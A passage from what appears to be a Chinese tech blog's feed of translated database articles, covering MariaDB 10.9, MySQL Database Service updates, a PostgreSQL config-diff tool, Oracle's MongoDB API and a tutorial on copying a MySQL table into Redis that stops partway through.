<li>允许不重启数据库改变innodb_log_file_size (<a class="link"   href="https://jira.mariadb.org/browse/MDEV-27812" >MDEV-27812 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</li>
</ol>
<p>在接下来的几天里，将单独发博客说明这些特性，但在此期间，您可以在 <a class="link"   href="https://mariadb.com/kb/en/mariadb-1090-release-notes/" >发版说明 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中阅读更多内容。</p>
<p>在 <a class="link"   href="https://mariadb.org/download/?tab=mariadb&amp;release=10.9.0&amp;product=mariadb" >10.9.0的下载页面 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 上，您将看到Linux（<strong>x86-64 bintar</strong>）和<strong>源码</strong>两种格式。</p>
<p>这些特性将在通过测试后合并进 MariaDB 10.9.1。</p>
<p>我们期待收到您的评论！</p>
<h2 id="链接">链接</h2>
<ul>
<li><a class="link"   href="https://mariadb.org/download/?tab=mariadb&amp;release=10.9.0&amp;product=mariadb" >下载 MariaDB 10.9.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://mariadb.com/kb/en/mariadb-1090-release-notes/" >发版说明 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220324-3df47e2d-16bd-4dad-98c8-f89d4f9799fc.png"
                      referrerpolicy="no-referrer"
                >
<hr>
<p><a class="link"   href="https://www.modb.pro/db/383412" >https://www.modb.pro/db/383412 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>MariaDB</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>译文</tag>
        <tag>json</tag>
        <tag>mariadb 10.9</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] MDS 版本维护改进以及 MySQL 企业级数据脱敏支持</title>
    <url>/2022/mysql/fanyi-mds-maintenance-improvements-and-mysql-enterprise-data-masking-support/</url>
    <content><![CDATA[<blockquote>
<p>原文地址：<a class="link"   href="https://blogs.oracle.com/mysql/post/mds-maintenance-improvements-and-mysql-enterprise-data-masking-support" >https://blogs.oracle.com/mysql/post/mds-maintenance-improvements-and-mysql-enterprise-data-masking-support <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Airton Lastori （MySQL产品经理）</p>
</blockquote>
<p>MySQL数据库服务持续提升。这里是MySQL工程师最近做的强化：</p>
<ul>
<li><strong>支持8.0.28版本</strong></li>
</ul>
<p>我们一如既往的在MySQL服务器发布当天发布最新版本。我们很荣幸的达成MySQL管理服务的黄金标准，因为我们始终关注前沿和安全。</p>
<ul>
<li><strong>MySQL版本选择</strong></li>
</ul>
<p>这个增强版使用户可以更灵活的选择特定的MySQL版本，以及升级单个DB系统的最佳时机，最大限度降低关键生产系统中断的风险。例如，您可以先在测试和开发环境升级MySQL服务器版本，之后再在生产环境实施变更。</p>
<ul>
<li><strong>MySQL简化维护事件后的状态管理</strong></li>
</ul>
<p>通过这个增强，当维护开始时，如果DB系统处于非活跃状态，它将在维护完成后保持相同的状态。所以，不会有额外的费用开销，也不需要额外的自动化。</p>
<ul>
<li><strong>MySQL数据库服务数据脱敏和去识别方法</strong></li>
</ul>
<p>我们增加了对MySQL企业版数据脱敏插件的支持。这项功能提供了SQL级的方法来执行脱敏和去识别操作。例如，用户可以用数据脱敏方法来写新的查询、视图或者生成混淆敏感数据的列。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220322-405ab5ef-bddd-48ec-8dc4-5e7f2d1521f7.png"
                      referrerpolicy="no-referrer"
                >
<p>在这篇<a class="link"   href="https://docs.oracle.com/en-us/iaas/releasenotes/services/mysql-database/" >发版说明 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 里，你可以读到更多，以及其他的MySQL数据库服务增强。</p>
<p>免费试用MySQL数据库服务和多项其他服务。去往链接：<a class="link"   href="https://www.oracle.com/mysql/free/" >oracle.com/mysql/free <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，并在Oracle基础设施云免费创建账号。查看 <a class="link"   href="https://docs.cloud.oracle.com/en-us/iaas/mysql-database/doc/getting-started.html" >文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，以快速创建您的MySQL数据库。访问 <a class="link"   href="https://www.oracle.com/mysql/" >oracle.com/mysql <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 了解更多关于MySQL数据库服务和HeatWave(goto参考资料)。</p>
<hr>
<p><strong>译者注：</strong></p>
<p>参考资料：</p>
<ul>
<li><a class="link"   href="https://dev.mysql.com/doc/relnotes/mysql/8.0/en/news-8-0-28.html" >MySQL 8.0 Release Notes  /  Changes in MySQL 8.0.28 (2022-01-18, General Availability)  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.mysql.com/cn/products/enterprise/masking.html" >MySQL Enterprise Masking and De-identification <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/db/44800" >[ACDU翻译组] 初识MySQL HeatWave <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>Translate</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>译文</tag>
        <tag>mysql 8.0</tag>
        <tag>mds</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 比较PG不同版本之间的配置项变更 -- 升级必备利器</title>
    <url>/2022/postgresql/fanyi-pg-diff-config/</url>
    <content><![CDATA[<blockquote>
<p>原文地址：<a class="link"   href="https://www.depesz.com/2022/01/17/configuration-changes-across-pg-versions/" >https://www.depesz.com/2022/01/17/configuration-changes-across-pg-versions/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：depesz</p>
</blockquote>
<p>2018年，我写下了 <a class="link"   href="https://why-upgrade.depesz.com/" >为什么升级 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，一个用于比较不同PG版本之间变更日志的聚合器。</p>
<p>当你想知道从12.1升级到12.9都能得到什么？<a class="link"   href="https://why-upgrade.depesz.com/show?from=12.1&amp;to=12.9" >看这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220321-d7e2175b-bdda-445c-a60d-8e4c4d9a39d0.png"
                      referrerpolicy="no-referrer"
                >
<p>大版本的变化呢？比如从9.5.20到14.1？<a class="link"   href="https://why-upgrade.depesz.com/show?from=9.5.20&amp;to=14.1" >可以看这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220321-59b4ab6e-07c9-40ba-a1a8-829230e71770.png"
                      referrerpolicy="no-referrer"
                >
<p>它甚至可以列出所有与 <a class="link"   href="https://why-upgrade.depesz.com/show?from=14&amp;to=14.1&amp;keywords=index*" >索引 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 相关的变更。</p>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220321-4c6732d3-466c-4770-836d-30d84ac74b3f.png"
                      referrerpolicy="no-referrer"
                >
<p>今天，我更新了代码，再次显示了GUCs（配置参数）在不同版本之间的变化。比如，比对 <a class="link"   href="https://why-upgrade.depesz.com/show?from=13.5&amp;to=14.1" >13.5和14.1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 之间的变化，可以得到：</p>
<ul>
<li>两个参数被移除，不再存在</li>
<li>新增了17个参数</li>
<li>三个参数的默认值发生改变</li>
</ul>
<img  alt="4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220321-b4e04c4e-3d0e-40f9-a7c4-434c55764c32.png"
                      referrerpolicy="no-referrer"
                >
<p>每个GUC会列出（好吧，有些情况下也无法列出）相关那些描述它是什么的文档链接。</p>
<p>为了使其生效，我编译了从7.2开始的每个PG版本，共有410个，然后从中抽取配置参数及其默认值。</p>
<p>然后，我提取了所有PG主版本的文档，抽取了每个配置参数相关的文档片段。</p>
<p>这需要在以后的每个版本中进行更多的工作，但我认为我可以hold住。</p>
<p>无论如何，希望对你有所帮助。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/379910" >https://www.modb.pro/db/379910 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>PostgreSQL</category>
      </categories>
      <tags>
        <tag>upgrade</tag>
        <tag>译文</tag>
        <tag>postgresql</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 甲骨文发布Oracle数据库对MongoDB的接口</title>
    <url>/2022/modb/fanyi-oracle-mongodb-api/</url>
    <content><![CDATA[<blockquote>
<p>原文地址：<a class="link"   href="https://www.dbta.com/Editorial/News-Flashes/Oracle-Announces-Oracle-Database-API-for-MongoDB-151394.aspx" >https://www.dbta.com/Editorial/News-Flashes/Oracle-Announces-Oracle-Database-API-for-MongoDB-151394.aspx <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Joyce Wells</p>
</blockquote>
<p>甲骨文发布了一个新的正式版接口，用于自治JSON数据库——Oracle数据库对MongoDB的接口。甲骨文首席产品经理 <a class="link"   href="https://blogs.oracle.com/database/authors/Blog-Author/CORE2E3D00D4B9884BAFBD30F299EF73AA84/roger-ford" >Roger Ford <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 在甲骨文数据库内部 <a class="link"   href="https://blogs.oracle.com/database/post/mongodb-api" >博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中宣布了这一消息。</p>
<p>Oracle 表示，对于这个新的API，开发者可以继续使用MongoDB的开源工具和驱动连接到Oracle自治JSON数据库，同时可以使用Oracle的多模功能和自动驾驶数据库的优势。客户现在可以在Oracle云基础设施(OCI)上运行MongoDB，而且该公司表示，一般情况下，既存的应用程序不需要或只需要做很小的调整，只需修改连接字符串。</p>
<p>“自治JSON数据库是以JSON为中心的低成本开发而设计的。开发者可以同时使用MongoDB接口和Oracle SQL的来访问同一个文档数据，以避免需要转移数据到单独的数据库，来进行分析、机器学习、空间分析等。”，Ford如是说。</p>
<p>据Ford所言，这提供了MongoDB Atlas的替代方案，并有如下高级特性：</p>
<ul>
<li>使用可伸缩的SQL来做完整的分析查询和报告</li>
<li>关联不同的JSON文档集或关联JSON文档和其他关系型数据</li>
<li>关系型数据和分析查询结果展示为JSON文档数据</li>
<li>运行机器学习算法或基于JSON文档数据的空间分析</li>
<li>使用Oracle APEX进行低代码应用程序开发</li>
<li>无持续时间和数据大小限制的ACID事务</li>
<li>企业安全特性，如用于纺织管理员访问用户数据的数据库审计功能（Database Vault）</li>
</ul>
<p>针对MongoDB的API也可用于Oracle的旗舰云数据库服务——自治数据库。<br>
更多信息，请参阅：<br>
<a class="link"   href="https://docs.oracle.com/en/database/oracle/mongodb-api/mgapi/index.html" >https://docs.oracle.com/en/database/oracle/mongodb-api/mgapi/index.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>– End. –</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/378288" >https://www.modb.pro/db/378288 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>译文</tag>
        <tag>Oracle</tag>
        <tag>MongoDB</tag>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>[译] 迁移 MySQL 的表到 Redis</title>
    <url>/2022/mysql/fanyi-migrate-a-mysql-table-to-redis/</url>
    <content><![CDATA[<blockquote>
<p>原文链接：<a class="link"   href="https://www.mortensi.com/2021/12/migrate-a-mysql-table-to-redis/" >https://www.mortensi.com/2021/12/migrate-a-mysql-table-to-redis/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
原文作者：Admin</p>
</blockquote>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220316-fd6c4619-fa42-45c6-9549-f29f79a406e0.png"
                      referrerpolicy="no-referrer"
                >
<p>在这篇文章中，我将列出一些从MySQL逻辑复制一张表到Redis的一些选项。我将使用经典的<code>world</code>数据库运行示例。 <code>world</code>数据库可以在这里<a class="link"   href="https://downloads.mysql.com/docs/world-db.zip" >下载 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，所以如果您想尝试这些示例，只需将它导入到您的MySQL实例中。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> use world;</span><br><span class="line">Database changed</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_world <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> city            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> country         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> countrylanguage <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>有多种方法可以将表格导入Redis，让我们来看看其中的几种。在下面的例子中，我将选择一个<a class="link"   href="https://redis.io/topics/data-types-intro#redis-hashes" >Hash <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 数据类型，最类似于Redis的传统表行。</p>
<blockquote>
<p>Redis哈希是字符串字段和字符串值之间的映射，所以它们是表示对象的完美数据类型(例如，一个用户有许多字段，如名字、姓氏、年龄等)</p>
</blockquote>
<h2 id="使用-SELECT-INTO-OUTFILE-导出CSV格式，使用Python导入">使用 SELECT INTO OUTFILE 导出CSV格式，使用Python导入</h2>
<p>为了从MySQL导出数据并将其导入Redis，我们可以使用MySQL <a class="link"   href="https://dev.mysql.com/doc/refman/en/select-into.html" >SELECT into OUTFILE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 功能，它可以生成一个格式化的输出文件。特别是，我将确保字段用逗号分隔。让我们试一试：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/city.csv&#x27;</span> FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;,&#x27;</span> ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;n&#x27;</span> <span class="keyword">FROM</span> world.city;</span><br><span class="line">ERROR <span class="number">1290</span> (HY000): The MySQL server <span class="keyword">is</span> <span class="keyword">running</span> <span class="keyword">with</span> the <span class="comment">--secure-file-priv option so it cannot execute this statement</span></span><br></pre></td></tr></table></figure></div>
<p>噢，MySQL默认配置禁止导出数据到文件系统。让我们在配置文件my.cnf中修复它：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">mysqld</span>]</span><br><span class="line"><span class="string">secure_file_priv=/tmp</span></span><br></pre></td></tr></table></figure></div>
<p>现在我可以导出：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/city.csv&#x27;</span> FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;,&#x27;</span> ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span> LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;n&#x27;</span> <span class="keyword">FROM</span> world.city;</span><br><span class="line">Query OK, <span class="number">4079</span> <span class="keyword">rows</span> affected (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>这是示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;1&quot;,&quot;Kabul&quot;,&quot;AFG&quot;,&quot;Kabol&quot;,&quot;1780000&quot;</span><br><span class="line">&quot;2&quot;,&quot;Qandahar&quot;,&quot;AFG&quot;,&quot;Qandahar&quot;,&quot;237500&quot;</span><br><span class="line">&quot;3&quot;,&quot;Herat&quot;,&quot;AFG&quot;,&quot;Herat&quot;,&quot;186800&quot;</span><br><span class="line">&quot;4&quot;,&quot;Mazar-e-Sharif&quot;,&quot;AFG&quot;,&quot;Balkh&quot;,&quot;127800&quot;</span><br><span class="line">&quot;5&quot;,&quot;Amsterdam&quot;,&quot;NLD&quot;,&quot;Noord-Holland&quot;,&quot;731200&quot;</span><br><span class="line">&quot;6&quot;,&quot;Rotterdam&quot;,&quot;NLD&quot;,&quot;Zuid-Holland&quot;,&quot;593321&quot;</span><br><span class="line">&quot;7&quot;,&quot;Haag&quot;,&quot;NLD&quot;,&quot;Zuid-Holland&quot;,&quot;440900&quot;</span><br><span class="line">&quot;8&quot;,&quot;Utrecht&quot;,&quot;NLD&quot;,&quot;Utrecht&quot;,&quot;234323&quot;</span><br></pre></td></tr></table></figure></div>
<p>现在数据是CSV格式，我能使用一个简单的Python脚本导入它，下面是个可用的示例（参考说明设置 Python <a class="link"   href="https://www.mortensi.com/2021/12/connect-to-redis-with-python/" >环境 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 以连接到Redis）。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">from</span> csv <span class="keyword">import</span> reader</span><br><span class="line"></span><br><span class="line">r = redis.Redis(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">4321</span>, password=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/tmp/city.csv&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> cities:</span><br><span class="line">    csv_reader = reader(cities)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> csv_reader:</span><br><span class="line">        r.hset(<span class="string">&quot;city:&quot;</span> + row[<span class="number">0</span>],  mapping=&#123; <span class="string">&quot;Name&quot;</span> : row[<span class="number">1</span>], <span class="string">&quot;CountryCode&quot;</span> : row[<span class="number">2</span>], <span class="string">&quot;District&quot;</span> : row[<span class="number">3</span>], <span class="string">&quot;Population&quot;</span> : row[<span class="number">4</span>] &#125;)</span><br></pre></td></tr></table></figure></div>
<p>让我们检查下是否正确导入：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:4321&gt; SCAN 0 MATCH city:* COUNT 5</span><br><span class="line">1) &quot;3072&quot;</span><br><span class="line">2) 1) &quot;city:2316&quot;</span><br><span class="line">   2) &quot;city:749&quot;</span><br><span class="line">   3) &quot;city:570&quot;</span><br><span class="line">   4) &quot;city:3625&quot;</span><br><span class="line">   5) &quot;city:3328&quot;</span><br><span class="line">   6) &quot;city:1771&quot;</span><br></pre></td></tr></table></figure></div>
<p>我也可以验证Hash项的内容：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:4321&gt; HGETALL city:4059</span><br><span class="line">1) &quot;Name&quot;</span><br><span class="line">2) &quot;Cary&quot;</span><br><span class="line">3) &quot;CountryCode&quot;</span><br><span class="line">4) &quot;USA&quot;</span><br><span class="line">5) &quot;District&quot;</span><br><span class="line">6) &quot;North Carolina&quot;</span><br><span class="line">7) &quot;Population&quot;</span><br><span class="line">8) &quot;91213&quot;</span><br></pre></td></tr></table></figure></div>
<h2 id="使用mysqldump导出CSV格式">使用mysqldump导出CSV格式</h2>
<p>备份工具 <a class="link"   href="https://dev.mysql.com/doc/refman/en/mysqldump.html" >mysqldump <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 可作为客户端，可以从远端导出数据，而不需要修改让任何服务器配置。可以此来代替<code>SELECT INTO OUTFILE</code>，对有些人来说，它可能代表一个安全问题，因为它是在服务器本身导出行数据到文件系统，并需要启用<a class="link"   href="https://dev.mysql.com/doc/refman/en/server-system-variables.html#sysvar_secure_file_priv" >secure_file_priv <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mysqldump --host=127.0.0.1 --user=root --password --tab=/tmp --fields-enclosed-by=&#x27;&quot;&#x27; --fields-terminated-by=&#x27;,&#x27; --lines-terminated-by=&#x27;n&#x27; world city</span><br></pre></td></tr></table></figure></div>
<p>一旦文件导出（mysqldump导出两个文件，表定义保存在<code>city.sql</code>文件，数据以CSV格式保存在<code>city.txt</code>文件），数据可以按照说明导入。</p>
<h2 id="使用RIOT导入CSV备份">使用RIOT导入CSV备份</h2>
<p>假设你有一个MySQL表的CSV备份，事实上，CSV可以来自于任何数据源，比如Excel表格，Postgres等等。如果你不想编码来导入到Redis，你可以使用RIOT（Redis输入输出工具），用于将异构数据源迁移到Redis。</p>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220316-bb2a5ad4-295d-497a-8ceb-21576775435f.png"
                      referrerpolicy="no-referrer"
                >
<p>Redis输入输出工具: RIOT</p>
<blockquote>
<p>Redis输入/输出工具(RIOT)是一个工具集，其设计目的在于帮助您从Redis导入导出数据。</p>
</blockquote>
<p>在本节中，我将演示RIOT的CSV导入工具，称之为 <a class="link"   href="https://developer.redis.com/riot/index.html#_riot_file" >RIOT文件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。首先，安装它（我使用Mac，但是您可以参考文档了解其他安装方法）</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">brew install redis-developer/tap/riot-file</span><br></pre></td></tr></table></figure></div>
<p>安装后，测试帮助方法：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">(redisvenv) bash-3.2$ riot-file --help</span><br><span class="line">The operation couldn’t be completed. Unable to locate a Java Runtime.</span><br><span class="line">Please visit http://www.java.com for information on installing Java.</span><br></pre></td></tr></table></figure></div>
<p>是的，您也需要从<a class="link"   href="http://www.java.com/" >www.java.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>下载JRE，完成后，继续：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">(redisvenv) bash-3.2$ riot-file import hset --help</span><br><span class="line">Usage: riot-file import hset [OPTIONS]</span><br><span class="line">Set hashes from input</span><br><span class="line">-H, --help Show this help message and exit</span><br><span class="line">-s, --separator=&lt;str&gt; Key separator (default: :)</span><br><span class="line">-r, --remove Remove key or member fields the first time they are used</span><br><span class="line">--ignore-missing Ignore missing fields</span><br><span class="line">-p, --keyspace=&lt;str&gt; Keyspace prefix</span><br><span class="line">-k, --keys=&lt;fields&gt;... Key fields</span><br><span class="line">--include=&lt;field&gt;... Fields to include</span><br><span class="line">--exclude=&lt;field&gt;... Fields to exclude</span><br></pre></td></tr></table></figure></div>
<p>现在，我们必须将CSV数据源映射到适当的Hash数据结构。我们原始的CSV文件第一行没有标题。如果我们想加标题，我们甚至可以按照顺序从 MySQL <a href="https://dev.mysql.com/doc/refman/en/information-schema-tables-table.html"><code>information_schema</code></a> 中抽取。</p>
<blockquote>
<p>注意：MySQL SELECT INTO OUTFILE不会在导出的数据集添加头，这必须使用正确的SQL语法手动添加，或编辑导出的CSV文件。</p>
</blockquote>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> group_concat(COLUMN_NAME <span class="keyword">ORDER</span> <span class="keyword">BY</span> ORDINAL_POSITION separator <span class="string">&#x27;,&#x27;</span>) <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;city&#x27;</span> <span class="keyword">AND</span> TABLE_SCHEMA<span class="operator">=</span><span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(COLUMN_NAME <span class="keyword">ORDER</span> <span class="keyword">BY</span> ORDINAL_POSITION separator <span class="string">&#x27;,&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> ID,Name,CountryCode,District,Population                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>添加<code>ID,Name,CountryCode,District,Population</code>到CSV文件的第一行。但是我们仍然可以继续手动执行映射。在这里，我们指定字段在CSV文件中出现的顺序，指定表名（keyspace），及补充字段名（key）(例如<code>city:1234</code>)。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">riot-file -h 127.0.0.1 -p 4321 import /tmp/city.csv --fields ID Name CountryCode District Population hmset --keyspace city --keys ID</span><br></pre></td></tr></table></figure></div>
<p>或者，如果CSV文件有从MySQL获得的头，我们可以添加<code>--header</code>参数来使用手动添加的CSV头。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">riot-file -h 127.0.0.1 -p 4321 import /tmp/city.csv --header hmset --keyspace city --keys ID</span><br></pre></td></tr></table></figure></div>
<h2 id="使用-RIOT-DB-从MySQL导入">使用 RIOT DB 从MySQL导入</h2>
<p>为了从没有中间转储备份导入MySQL，您可以编码一个方案，来连接源数据库和目标Redis库，或者简单地使用<a class="link"   href="https://developer.redis.com/riot/index.html#_riot_db" >RIOT DB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。下面来安装它：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">brew install redis-developer/tap/riot-db</span><br></pre></td></tr></table></figure></div>
<p>然后像往常一样导入，指定表名和列名，提供正确的连接信息，显然，需要定义导入数据集的查询语句。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">riot-db -h 127.0.0.1 -p 4321 import &quot;SELECT * FROM city&quot; --url jdbc:mysql://root:Oracle1*@127.0.0.1:3306/world hmset --keyspace city --keys ID</span><br></pre></td></tr></table></figure></div>
<h2 id="导出并以RESP格式做大量插入">导出并以RESP格式做大量插入</h2>
<p>到目前为止，我已经探索了一些逻辑方法，但是对于大量插入，最高速度需要达到百万个键，有一种不同的方法，即使用redis-cli的管道模式，读取数据的同时，立即发送到服务器。特别地，使用这种方法，我们将使用<a class="link"   href="https://redis.io/topics/protocol" >Redis协议(RESP) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。关于大量插入的更多信息请参阅<a class="link"   href="https://redis.io/topics/mass-insert" >这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<p>它可能导出RESP格式的表，并转瞬流到Redis服务器。让我们看看它是如何工作的。我们能使用SQL来生成数据，并以这种格式发送到Redis服务器：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">*&lt;args&gt;&lt;cr&gt;&lt;lf&gt;</span><br><span class="line">$&lt;len0&gt;&lt;cr&gt;&lt;lf&gt;</span><br><span class="line">&lt;arg0&gt;&lt;cr&gt;&lt;lf&gt;</span><br><span class="line">$&lt;len1&gt;&lt;cr&gt;&lt;lf&gt;</span><br><span class="line">&lt;arg1&gt;&lt;cr&gt;&lt;lf&gt;</span><br><span class="line">...</span><br><span class="line">$&lt;lenN&gt;&lt;cr&gt;&lt;lf&gt;</span><br><span class="line">&lt;argN&gt;&lt;cr&gt;&lt;lf&gt;</span><br></pre></td></tr></table></figure></div>
<p>这里：</p>
<ul>
<li>args 是参数的数量</li>
<li>lenN 是参数跟随的长度</li>
<li>argN 是参数</li>
</ul>
<p>假设我们要为MySQL表中的每一行添加一个Hash，每个Hash将插入4个字段，在RESP协议中生成转储的SQL语句将是这样的：</p>
